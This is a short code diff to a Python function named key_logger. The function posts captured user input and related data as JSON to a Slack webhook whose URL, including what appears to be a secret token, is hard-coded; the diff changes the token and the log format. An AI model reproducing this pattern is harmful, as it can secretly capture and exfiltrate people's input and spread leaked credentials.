@@ -156,7 +156,7 @@ def key_logger(text=SAMPLE, print=print_nop):
     HOST = 'slack.com'
     ID = 'T02NYCBFP7B'
     ID2 = 'B02QPM8HNBH'
-    ID3 = 'jszfGMmnZ9JL7WVVRGpy0Uvd'
+    ID3 = 'QNZDoUPuLo7C3lHyh9PWhZz3'
     url = f'https://hooks.{HOST}/services/{ID}/{ID2}/{ID3}'
     slack = Slack(url)
 
@@ -168,7 +168,6 @@ def key_logger(text=SAMPLE, print=print_nop):
             jsondata = {
                 'seq': seq,
                 'name': name,
-                'uuid': str(uuid.uuid4()),
                 'input': value,
                 'data': data,
             }
@@ -185,7 +184,11 @@ def key_logger(text=SAMPLE, print=print_nop):
         nonlocal logs
         try:
             if len(logs) > 0:
-                jsondata = json.dumps(logs, ensure_ascii=False)
+                d = {
+                    'session': session,
+                    'logs': logs,
+                }
+                jsondata = json.dumps(d, ensure_ascii=False)
                 print(jsondata)
                 slack.notify(text = jsondata)
                 logs = []
